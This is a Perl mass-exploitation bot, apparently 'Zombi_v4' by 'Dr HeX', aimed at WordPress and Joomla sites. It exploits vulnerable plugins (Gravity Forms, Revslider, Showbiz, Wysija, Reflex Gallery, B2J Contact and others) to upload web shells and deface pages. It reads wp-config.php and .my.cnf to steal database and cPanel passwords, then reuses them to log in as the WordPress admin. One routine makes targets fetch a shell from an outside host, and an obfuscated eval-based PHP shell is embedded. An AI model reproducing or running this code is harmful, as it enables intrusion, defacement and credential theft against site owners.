my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["v4gravity.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "v4.php"]);

my $check = $ua->get("$target/wp-content/uploads/_input_3_v4.php")->content;
if($check =~/Bot Dr HeX v4/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"[True Success]\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $gravityformsup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
}
else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False";
print color('bold white'),"\n";
gravityforms2();
}
}
################ Gravity Forms #####################
sub gravityforms2(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["v4def.jpg"], form_id => '1', name => 'hex.html', gform_unique_id => '../../../../../', field_id => '3',]);
$gravityformsupp = "$site/_input_3_hex.html";
my $checkgravityformsupp = $ua->get("$gravityformsupp")->content;
if ($checkgravityformsupp =~ /Hacked Bot Dr HeX v4/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," =====HeX=====> ";
print color('bold green'),"[Payload Success]\n";
print color('bold red'),"Shell Not Uploaded\n";

print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"  [Get] => $gravityformsupp\n";
open (TEXT, '>>Zombi_v4/v4index.txt');
print TEXT "$gravityformsupp\n";
close (TEXT);
$def = $gravityformsupp;
zoneh();
}
else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}



################ Revslider ajax #####################
sub revsliderajax(){

my $url = "$site/wp-admin/admin-ajax.php";

my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Struck By Dr HeX<b>"]);

$revsliderajax = $site . '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

my $checkrevsajax = $ua->get("$revsliderajax")->content;
if($checkrevsajax =~ /Dr HeX/){
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Defaced Successfully\n";
print color('bold white'),"  [Get] => $revsliderajax\n";
open (TEXT, '>>Zombi_v4/v4index.txt');
print TEXT "$revsliderajax\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}

sub getconfig{
$url = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Revslider Get Config";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
     open(save, '>>Zombi_v4/Configrev.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
    getcpconfig();
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Revslider Get Config";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}

sub getcpconfig{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Revslider Get cPanel";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";

$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){


print color('bold white'),"URL : $site/cpanel\n";
print color('bold white'),"USER : $1\n";
open (TEXT, '>>Zombi_v4/cPanel.txt');
print TEXT "Url : $site\n";
print TEXT "USER : $1\n";
close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
            print color('bold Yellow')," [";
print color('bold red'),"+";
print color('bold Yellow'),"] ";
print color('bold white'),"PASS : $1\n";
open (TEXT, '>>Zombi_v4/cPanel.txt');
print TEXT "PASS : $1\n";
close (TEXT);
        }


}
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Revslider Get cPanel";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}


####################################################################################################
####################################################################################################
#####################################       REVSLIDER       ########################################
####################################################################################################
####################################################################################################
sub getconfig2{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print colored ("Revslider Get Config2",'bold white');
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){

print " =====HeX=====> ";
print color('bold white');
print color('reset');
print color('bold Yellow');
print "VULN";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Zombi_v4/Try_Manulle.txt');   
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print color("Yellow"),"\t
	[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print color("Yellow"),"\t[+]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print color("Yellow"),"\t[+]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print color("Yellow"),"\t[+]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Zombi_v4/databases.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

wpbrute2();
getcpconfig2();
}}else{

   print " =====HeX=====> ";
print color('bold white');
print color('reset');
print color('bold red');
print "False";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
getcpconfig2();

}

}

####################################################################################################
####################################################################################################

sub getcpconfig2{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
    open(save, '>>Zombi_v4/Try_Manulle.txt');   
    print save "[rev cpnl] $site\n";   
    close(save);
	
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

        print color("Yellow"),"\n\t[+]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>Zombi_v4/cpanels.txt');
        print TEXT "\n[ cpanel ] \n$site\n[+]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print color("Yellow"),"\t[+]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Zombi_v4/cpanels.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}
}




####################################################################################################
####################################################################################################
####################################################################################################
sub revdef(){
print colored ("DEFACE AJAX",'bold white');

$ajx = $site . 'wp-admin/admin-ajax.php';

$def = $site .'wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

$lasba = POST $ajx, ['action' => 'revslider_ajax_action', 'client_action' => 'update_captions_css', 'data' =>"<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Hacked By hex</b><br>Dr HeX<p style='color: transparent'>"];
$response = $ua->request($lasba);
$stat = $response->content;
 if ($stat =~ /true/){
print  " =====HeX=====> ";
print color('bold white');
print color('reset');
print color('bold Yellow');
print "SUCCESS";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


my $checkajx= $ua->get("$def")->content;
if($checkajx =~/Hacked|hex|Dr HeX/) {

        open(save, '>>Zombi_v4/v4index.txt');   
    print save "[rev deface] $site\n";   
    close(save);
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print "DEFACE +++++++++++++++++++++++++ ";
print color('bold white');
print color('reset');
print color('bold Yellow');
print "SUCCESS";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
print "LINK INDEX +++++++++++++++++++++++++ ";
    print color('bold white');
print color('reset');
print color('bold Yellow');
print "SAVED";
print color('reset');
print color('bold white');
print color('reset'); 
print " \n";
zoneh();
}
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print "+++++++++++++++++++++++++ \n";
print color('bold white');
print color('reset');
print color('bold red');
print "False";
print color('reset');
print color('bold white');
print color('reset'); 
print " \n";

}
}
####################################################################################################
####################################################################################################
############################### PHP MY ADMIN SCANNER ##############################################
####################################################################################################
####################################################################################################
sub zebbi{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print colored ("PMA Scanner",'Bold white');
print " =====HeX=====> ";
print color('bold white');
print color('reset');
print color('bold blue');
print "WAIT";
print " \n";
print color('reset');
print color('bold white');
print color('reset');
use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
print "[$pma] ++++++++++++++ ";
print color('bold white');
print color('reset');
print color('bold Yellow');
print "Founded";
print color('reset');
print color('bold white');
print color('reset');
open (TEXT, '>>Zombi_v4/databases.txt');
print TEXT "\n[PhpMyAdmin] $url   =>   PMA Founded !!\n\n";
close (TEXT);

}else{

print "[$pma] ++++++++++ ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOt Founded";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

}}
print "PMA SCAN +++++++++++++++++++++ ";
print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "DONE";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
revdef();

}
####################################################################################################
####################################################################################################
####################################### WORDPRESS BRUTE ############################################
####################################################################################################
####################################################################################################
sub wpbrute2{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print colored ("Brute With Config Pass",'bold white');
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";
print " =====HeX=====> ";
print color('bold white');
print color('reset');
print color('bold blue');
print "WAIT";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
print "[Info] USER : $admin\n";
print "[Info] PASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
print "[BRUTE] +++++++++++++++ ";
            print color('bold white');

print color('reset');
print color('bold Yellow');
print "LOGIN SUCCESS";
print color('reset');
print " \n";
print color('bold white');

        open (TEXT, '>>Zombi_v4/brute.txt');
        print TEXT "\n[BRUTE][BOOM] $site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
            print "[BRUTE] +++++++++++++++++++++ ";
            print color('bold white');

print color('reset');
print color('bold red');
print "User And Password Dont Match";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
}
zebbi();
}

################ Showbiz #####################
sub showbiz(){
my $url = "$url/wp-admin/admin-ajax.php";
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["v4.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/v4.php';

my $checkshow = $ua->get("$showbizup")->content;
if($checkshow =~ /Dr HeX Shell/){
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Showbiz";
print color('bold white')," +++++++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $showbizup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$showbizup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Showbiz";
print color('bold white')," +++++++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ Simple Ads Manager #####################
sub ads(){  
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["v4.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/v4.php";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Simple Ads Manager";
print color('bold white')," ++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $adsup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$adsup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Simple Ads Manager";
print color('bold white')," ++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ Slide Show Pro #####################
sub slideshowpro(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["v4.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/v4.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/v4.php";
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Slide Show Pro";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $sspup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$sspup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Slide Show Pro";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################################## WP Mobile Detector ########################################
##############################################################################################
# check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
##############################################################################################
sub wpmobiledetector(){ 
$wpmdshell = "http://misterhexbot.com/wpmobile/v4.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/v4.php";

my $check = $ua->get("$url"); 

my $checkup = $ua->get("$wpmdup")->content; 
if($checkup =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"WP Mobile Detector";
print color('bold white')," ++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $wpmdup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"WP Mobile Detector";
print color('bold white')," ++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ WYSIJA #####################
sub wysija(){
$theme = "my-theme";
my $url = "$site/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['v4wysija.zip', => 'v4wysija.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/v4wysija/v4.php";
my $checkwysija = $ua->get("$wysijaup")->content;
if($checkwysija =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Wysija";
print color('bold white')," ++++++++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $wysijaup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$wysijaup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Wysija";
print color('bold white')," ++++++++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ InBoundio Marketing #####################
sub inboundiomarketing(){ 
my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/v4.php";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["v4.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/Dr HeX Shell/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"InBoundio Marketing";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $inbomarketingup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$inbomarketingup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"InBoundio Marketing";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}


################ dzs-zoomsounds #####################
sub dzszoomsounds(){ 
my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/v4.php";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["v4.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"dzs-zoomsounds";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $dzsup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$dzsup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"dzs-zoomsounds";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ reflex-gallery #####################/
sub reflexgallery(){ 
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/v4.php";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["v4.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Reflex Gallery";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $reflexup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$reflexup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Reflex Gallery";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ comadsmanager #####################
sub comadsmanager(){
my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["tool/XAttacker.jpg"], name => "tool/XAttacker.html"]
           
            );

$comadsmanagerup="$site/tmp/plupload/XAttacker.html";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/HaCKeD/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold white')," +++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold Yellow')," [";
print color('bold red'),"+";
print color('bold Yellow'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $comadsmanagerup\n";
open (TEXT, '>>Zombi_v4/index.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold white')," +++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ b2jcontact #####################
sub b2j(){

my @filesz = ('/kontakty','iletisim','contatti.html','contact-us','contact-us.html','/contact','contacto','/index.php/contato.html','en/contact','contactenos');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
my $checkfoxupx = $ua->get("$url")->content;
if($checkfoxupx =~/b2j/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," ++++++++++++++++++++++++";
print color('bold Yellow'),"VULN\n";
print color('bold red'), "Testing Vuln $url \n";
    print color('reset');
	my $regex='" name="cid_(.*?)"';
    if($checkfoxupx =~ s/$regex//){
    print color("bold red"), "Cid no: $1\n";
	    print color('reset');
	my $out = $1;
	my $regex='bid=(.*?)"';
    if($checkfoxupx =~ s/$regex//){
    print color("bold red"), "Bid no: $1\n";
		my $bid = $1;
		my $izo = $site . 'index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='.$out.'&amp;bid='.$bid.'&amp;root=&type=uploader&&owner=component&id='.$out.'&qqfile=586cfc73826e4-/../hex.php';
		    print color('reset');
my $index='<h5>Uploder hex</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAv4mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>';
my $body = $ua->post( $izo,
        Content_Type => 'multipart/form-data',
        Content => $index
        );
my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/hex.php")->content;
if ($checkfoxupx =~ /Uploder hex/) {	
print color('bold red'),"Shell Uploaded Successfully\n";
print color('bold Yellow'),"[ShellLink] => $site/components/com_b2jcontact/uploads/hex.php\n";
		    print color('reset');
open (TEXT, '>>Zombi_v4/shell.txt');
print TEXT "$site/components/com_b2jcontact/uploads/hex.php\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold red'),"False\n";			
}
}
}
}
}
}
sub b22j(){

my @filesz = ('/index.php/contact','/index.php/contact/adres','/kontakty','kontakty.html','contatti.html','/index.php/kontakty','/contact','contacto','/index.php/contato.html','en/contact','contactenos','contact-us');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
	print colored ("[ Scanning B2J]",'white on_blue'),$url."\n";
my $cms = $ua->get("$url")->content;
if($cms =~/b2j/) {
    print color("bold red"), "Joomla B2jcontact Found\n";
print color('bold red'), "Testing Vuln $url - \n";
    print color('reset');
    my $regex='name="b2jmoduleid_(.*?)"';
    if($cms =~ s/$regex//){
    print color("bold red"), "Cid no: $1\n";
	    print color('reset');
	my $out = $1;
	my $regex='bid=(.*?)"';
    if($cms =~ s/$regex//){
	my $bid = $1;
    print color("bold red"), "Bid no: $1\n";
}	
my @filesx = ('/index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='.$out.'&amp;bid='.$bid.'&amp;root=&type=uploader&&owner=component&id='.$out.'&qqfile=586cfc73826e4-/../hex.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../hex.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid='.$bid.'&id='.$out.'&Itemid='.$out.'&qqfile=586cfc73826e4-/../hex.php','/index.php/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../hex.php','/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../hex.php','index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../hex.php','/index.php/contact/loader/component/'.$out.'/components/b2jcontact/1&qqfile=586cfc73826e4-/../hex.php');
OUTER: foreach my $vulx(@filesx){
 my $izo = $site . $vulx; 
		print color('reset');		
my $index='<h5>Uploder hex</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAv4mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
